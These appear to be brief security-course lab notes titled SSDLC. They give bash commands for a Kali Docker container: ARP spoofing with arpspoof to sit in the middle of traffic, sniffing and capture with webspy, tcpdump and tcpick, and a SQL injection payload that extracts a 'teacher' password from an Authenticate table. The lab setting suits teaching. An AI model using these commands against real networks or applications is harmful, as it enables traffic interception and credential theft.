# Secure Software Development Lifecycle (SSDLC)

```bash
# use this command to connect into the docker container
docker exec -it kali /bin/bash
docker exec -it browsh /app/bin/browsh
# use this to MITM the traffic
arpspoof -t <target> <gateway>
arpspoof -t <gateway> <target>
# use this to view live traffic
webspy -i <interface>
# use this to save all traffic to a file
tcpdump -i <interface> -w <file> -s 0 tcp
# use this to view the saved traffic
tcpick -C -yP -r <file>
# use this is the password todo sql injection
'+(SELECT userPW FROM Authenticate WHERE userID='teacher')+'
```